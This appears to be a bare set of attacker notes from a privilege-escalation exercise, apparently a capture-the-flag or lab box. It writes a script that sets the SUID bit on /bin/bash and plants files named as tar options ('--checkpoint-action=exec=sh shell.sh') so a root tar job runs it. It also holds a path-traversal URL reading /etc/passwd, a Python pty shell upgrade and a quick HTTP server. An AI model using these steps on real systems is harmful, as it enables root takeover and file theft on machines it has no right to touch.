ls -la /bin/bash
date
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
ls -al /bin/bash 
date 
ls -al /bin/bash

alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
python -c 'import pty; pty.spawn("/bin/bash")'
python -m SimpleHTTPServer 8888
